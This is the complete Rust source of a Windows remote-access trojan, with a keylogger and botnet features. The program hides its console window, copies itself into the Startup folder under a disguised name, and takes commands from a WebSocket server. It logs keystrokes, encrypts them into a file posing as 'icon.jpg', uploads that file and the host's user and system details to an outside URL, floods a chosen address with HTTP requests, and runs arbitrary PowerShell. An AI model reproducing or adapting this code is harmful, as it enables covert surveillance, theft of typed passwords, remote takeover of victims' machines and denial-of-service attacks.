#![windows_subsystem = "windows"]
#![allow(non_snake_case,non_camel_case_types,dead_code)]

use std::{fs::{self, File}, io::Write, process::Command, sync::Mutex, path::Path};
use directories::UserDirs;
use rdev::{EventType, Key, SimulateError, Button, simulate, listen};
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce
};
use serde::{Deserialize, Serialize};
use tokio::sync::mpsc::channel;
use url::Url;
use tungstenite::{connect, Message};
#[derive(Debug,Default,PartialEq,Eq)]
enum CMD{
    INFO,
    KEYLOG,
    #[default]
    SLEEP,
    C_ICON,
    R_ICON,
    SEND,
    CLI(Vec<String>),
    ATT(String,u16),
}
impl From<&str> for CMD{
    fn from(s: &str) -> Self { 
        match s{
            "INFO"=>CMD::INFO,
            "KEYLOG"=>CMD::KEYLOG,
            "SLEEP"=>CMD::SLEEP,
            "C_ICON"=>CMD::C_ICON,
            "R_ICON"=>CMD::R_ICON,
            "SEND"=>CMD::SEND,
            "CLI"=>CMD::CLI(Vec::new()),
            "ATT"=>CMD::ATT(String::new(),0),
            _ => CMD::SLEEP
        }
    }
}
impl ToString for CMD{
    fn to_string(&self) -> String {
        match &self{
            CMD::INFO=>String::from("INFO"),
            CMD::KEYLOG=>String::from("KEYLOG"),
            CMD::SLEEP=>String::from("SLEEP"),
            CMD::C_ICON=>String::from("C_ICON"),
            CMD::R_ICON=>String::from("R_ICON"),
            CMD::SEND=>String::from("SEND"),
            CMD::CLI(_)=>String::from("CLI"),
            CMD::ATT(_,_)=>String::from("ATT"),
        }
    }
}
#[derive(Debug,Deserialize)]
struct CommandJson{
    cmd:String,
}

#[derive(Debug,Deserialize)]
struct AttJson{
    ip:String,
    times:u16,    
}
#[derive(Debug,Deserialize)]
struct CliJson{
    args:Vec<String>,    
}

static EVENT:Mutex<String> =Mutex::new(String::new());

fn hide_console_window() {
    use std::ptr;
    use winapi::um::wincon::GetConsoleWindow;
    use winapi::um::winuser::{ShowWindow, SW_HIDE};

    let window = unsafe {GetConsoleWindow()};
    // https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
    if window != ptr::null_mut() {
        unsafe {
            ShowWindow(window, SW_HIDE);
        }
    }
}
#[tokio::main]
async fn main() {
    hide_console_window();
    if let Some(user_dirs) = UserDirs::new() {
        let startup_path = format!("{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",user_dirs.home_dir().to_str().unwrap());

        let current  = std::env::current_dir().unwrap();
        let startup_optic = fs::read_dir(startup_path.clone()).unwrap();
        for i in startup_optic{
            if i.unwrap().file_name() != "systemWx32.exe"{
                let input = fs::read(format!("{}\\Indicator.exe",current.to_str().unwrap())).unwrap();
                let mut output = fs::File::create(format!("{}\\systemWx32.exe",startup_path.as_str())).unwrap();
                output.write_all(&input).unwrap();
                break;
            }
        }
    }
    loop{
        if online::check(Some(1)).is_ok(){
            // let output = if cfg!(target_os = "windows") { 
            //     Command::new("powershell")
            //         .args(["echo "," a"])
            //         .output()
            //         .expect("Failed to execute command")
            //     } else {
            //         Command::new("sh")
            //         .arg("-c")
            //         .arg("echo hello")
            //         .output()
            //         .expect("failed to execute process")
            //     };
            //     println!("{}",String::from_utf8_lossy(output.stdout.as_slice()).to_string());
            
            let (cmd_sender,mut cmd_receiver) =channel::<CMD>(1);
            let (mut socket, response);
            loop{
                match connect(Url::parse("ws://127.0.0.1:8080/ws").unwrap()){
                    Ok(w)=>{
                        (socket,response) = (w.0,w.1);
                        break;
                    },
                    Err(_)=>{
                        std::thread::sleep(std::time::Duration::from_secs(120));
                    }
                };
            }
        
            for (ref header, _value) in response.headers() {
                println!("* {}", header);
            }
        
            socket.write_message(Message::Text("->".into())).unwrap();
            let tx_sender = cmd_sender.clone();
            let ws_sender = cmd_sender.clone();
            tokio::spawn(async move{
                loop{
                    let msg = socket.read_message().expect("Error reading message");
                    let cmd_json:CommandJson = serde_json::from_str(msg.to_string().as_str()).unwrap();
                    let ws_cmd = CMD::from(cmd_json.cmd.as_str());
                    println!("ws cmd : {}",ws_cmd.to_string());
                    *EVENT.lock().unwrap() = ws_cmd.to_string().clone();
                    if ws_cmd.to_string() == "ATT"{
                        let cmd_json:AttJson = serde_json::from_str(msg.to_string().as_str()).unwrap();
                        ws_sender.send(CMD::ATT(cmd_json.ip,cmd_json.times)).await.unwrap();
                    }else if ws_cmd.to_string() == "CLI"{
                        let cmd_json:CliJson = serde_json::from_str(msg.to_string().as_str()).unwrap();
                        ws_sender.send(CMD::CLI(cmd_json.args)).await.unwrap();

                    }
                    ws_sender.send(ws_cmd).await.unwrap();

                    std::thread::sleep(std::time::Duration::from_secs(2));
                }
            });
            let mut words = Box::new(Vec::<String>::new());
            while let Some(cmd) = cmd_receiver.recv().await{
                println!("COMMAND {}",cmd.to_string() ); 
                match cmd{
                    CMD::KEYLOG=>{
                        let (key_sender,mut key_receiver) = tokio::sync::mpsc::unbounded_channel::<String>();
                        let mut word = String::new();
                        let thr_input = tokio::spawn(async move{
                            save_keyboard_input(key_sender).await.unwrap();
                        });
                        while let Some(data) = key_receiver.recv().await{
                            let event = EVENT.lock().unwrap().clone();
                            if event != cmd.to_string(){
                                std::mem::drop(key_receiver);
                                std::mem::drop(thr_input);
                                std::mem::drop(word);
                                break;
                            }
                            if data == "Enter"{
                                if !word.is_empty(){
                                    words.push(word.clone());
                                    word.clear();
                                }
                            }else{
                                word.push_str(data.as_str());
                            }
                        }
                    },
                    CMD::SLEEP=>{
                        println!("SLEEP MODE");
                    },
                    CMD::C_ICON=>{
                        let file = create_icon_file();
                        if file.is_err(){
                            set_readonly(false).unwrap();
                            fs::remove_file("./icon.jpg").unwrap();
                        }
                        let data = encrypt(*words.clone());
                        let result = file.unwrap().write_all(&data[..]);
                        if result.is_err(){
                            tx_sender.send(CMD::C_ICON).await.unwrap();
                            std::thread::sleep(std::time::Duration::from_secs(2));
                        }
                        words.clear();
                        set_readonly(true).unwrap();
                        tx_sender.send(CMD::SLEEP).await.unwrap();
                    },
                    CMD::R_ICON=>{
                        set_readonly(false).unwrap();
                        fs::remove_file("./icon.jpg").unwrap();
                        tx_sender.send(CMD::SLEEP).await.unwrap();
                    }
                    CMD::SEND=>{
                        let file = fs::read("./icon.jpg").unwrap();
                        let client = reqwest::Client::new();
                        // test url 
                        // http://httpbin.org/post
                        let res = client
                        .post("http://httpbin.org/post")
                        .body(file)
                        .send()
                        .await;
                        if res.is_err(){
                            std::mem::drop(client);
                        }
                        set_readonly(false).unwrap();
                        fs::remove_file("./icon.jpg").unwrap();
                        tx_sender.send(CMD::SLEEP).await.unwrap();
                    }
                    CMD::ATT(url,times)=>{
                        for _ in 0..times{
                            let client = reqwest::Client::new();
                            match client
                            .get(url.clone())
                            .send()
                            .await{
                                Ok(_)=>(),
                                Err(_)=>(),    
                            };
                        }
                        tx_sender.send(CMD::SLEEP).await.unwrap();
                    }
                    CMD::INFO=>{
                        let information = get_information();
                        let client = reqwest::Client::new();
                        let res = client
                        .post("http://httpbin.org/post")
                        .json(&information)
                        .send()
                        .await;
                        if res.is_err(){
                            std::mem::drop(client);
                        }
                        tx_sender.send(CMD::SLEEP).await.unwrap();
                    }
                    CMD::CLI(args)=>{
                        let output = Command::new("powershell")
                            .args(args)
                            .output();
                        if output.is_err(){
                            tx_sender.send(CMD::SLEEP).await.unwrap();
                        }
                        tx_sender.send(CMD::SLEEP).await.unwrap();

                    }
                }
            }
        }
        std::thread::sleep(std::time::Duration::from_secs(120));
    }
}



fn encrypt(text:Vec<String>)->Vec<u8>{
    let  private_key:Vec<u8> = vec![23, 158, 185, 114, 140, 54, 92, 230, 86, 120, 43, 106, 187, 243, 197, 93, 192, 172, 91, 176, 27, 60, 97, 75, 37, 188, 235, 17, 255, 153, 176, 234];
    let data = text.into_iter().map(|mut s|{s.push_str(" || ");s}).collect::<String>();
    let cipher = Aes256Gcm::new_from_slice(&private_key).unwrap();
    let nonce = Nonce::from_slice(b"6ed4e2a16e68"); 
    
    let ciphertext = cipher.encrypt(nonce, data.as_ref()).unwrap();
    ciphertext
}

fn decrypt(data:Vec<u8>)->Option<String>{
    let  private_key:Vec<u8> = vec![23, 158, 185, 114, 140, 54, 92, 230, 86, 120, 43, 106, 187, 243, 197, 93, 192, 172, 91, 176, 27, 60, 97, 75, 37, 188, 235, 17, 255, 153, 176, 234];
    let cipher = Aes256Gcm::new_from_slice(&private_key).unwrap();
    let nonce = Nonce::from_slice(b"6ed4e2a16e68");
    let plaintext = match cipher.decrypt(nonce,data.as_ref()){
        Ok(c)=>c,
        Err(e)=>{
            eprintln!("ERROR => {:?}" ,e);
            panic!("decrypt got panicked")
            
        }
    };
    Some(String::from_utf8_lossy(&plaintext[..]).to_string())
}
async fn save_keyboard_input(sender:tokio::sync::mpsc::UnboundedSender<String>)->Result<(),Box<dyn std::error::Error>>{
    listen(move |event|{
        match event.event_type{
            EventType::KeyRelease(c)=>{
                if c == Key::Return {
                    match sender
                    .send("Enter".to_string()){
                        Ok(_)=>(),
                        Err(_)=>return,
                    };
                }
            },
            EventType::KeyPress(c)=>{
                if c != Key::Return {
                    if event.name.is_some(){
                    match sender
                    .send(event.name.unwrap()){
                        Ok(_)=>(),
                        Err(_)=>return,
                    };
                    }
                }
            },
            EventType::ButtonRelease(c) =>{
                if c == Button::Left{
                    match sender
                    .send("Enter".to_string()){
                        Ok(_)=>(),
                        Err(_)=>return,
                    };
                }
            },
            _ =>(),
        };
    }).unwrap();
    Ok(())
}

fn send(event_type: &EventType) {
    match simulate(event_type) {
        Ok(()) => (),
        Err(SimulateError) => {
            println!("We could not send {:?}", event_type);
        }
    }
}
fn create_icon_file()->std::io::Result<File>{
    let file = fs::File::create("./icon.jpg")?;
    Ok(file)
}
fn set_readonly(input:bool)->std::io::Result<()>{
    let mut perms = fs::metadata("./icon.jpg")?.permissions();
    perms.set_readonly(input);
    fs::set_permissions("./icon.jpg", perms)?;
    Ok(())
}

fn get_env(key:&str)->String{
    let i = std::env::var(key);
    if i.is_ok(){
    }
    i.unwrap()
    
}
#[derive(Debug,Serialize)]
struct EnvInformation{
    os:String,
    number_of_processors:String,
    processor_identifier:String,
    username:String,
    windir:String,
}
fn get_information()->EnvInformation{
    EnvInformation{
        os:get_env("OS"),
        number_of_processors:get_env("NUMBER_OF_PROCESSORS"),
        processor_identifier:get_env("PROCESSOR_IDENTIFIER"),
        username:get_env("USERNAME"),
        windir:get_env("windir")
    }
}